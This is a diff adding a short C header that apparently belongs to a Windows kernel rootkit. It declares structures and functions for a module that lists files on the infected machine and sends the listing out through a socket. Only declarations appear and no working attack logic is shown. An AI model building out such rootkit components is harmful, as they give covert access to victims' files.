@@ -1,0 +1,28 @@
+#pragma once
+
+typedef struct _ROOTKIT_FILEEXPLORER_ENTRY {
+#ifndef _WIN64
+	LIST_ENTRY Entry;
+#else
+	LIST_ENTRY64 Entry;
+#endif
+	CHAR FileName[255];
+	CHAR CreateTime[255];
+	CHAR WriteTime[255];
+}ROOTKIT_FILEEXPLORER_ENTRY, *PROOTKIT_FILEEXPLORER_ENTRY;
+
+typedef struct _ROOTKIT_FILEEXPLORER_LIST_HEAD {
+#ifndef _WIN64
+	LIST_ENTRY Entry;
+#else
+	LIST_ENTRY64 Entry;
+#endif
+	ULONG NumberOfElements;
+}ROOTKIT_FILEEXPLORER_LIST_HEAD, *PROOTKIT_FILEEXPLORER_LIST_HEAD;
+
+NTSTATUS QueryCompletion(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context);
+PROOTKIT_FILEEXPLORER_LIST_HEAD g_fileexplorer_head;
+PROOTKIT_FILEEXPLORER_LIST_HEAD kernel_get_number_files(IN PCHAR FileName, IN PROOTKIT_API_HASH Hash);
+ULONG rk_copy_fileexplorer_list_to_buffer(IN PROOTKIT_FILEEXPLORER_ENTRY Buffer, IN PROOTKIT_API_HASH Hash);
+BOOLEAN rk_send_fileexplorer_to_userspace(IN PFILE_OBJECT socket, IN PCHAR FileName, IN PROOTKIT_API_HASH Hash);
+
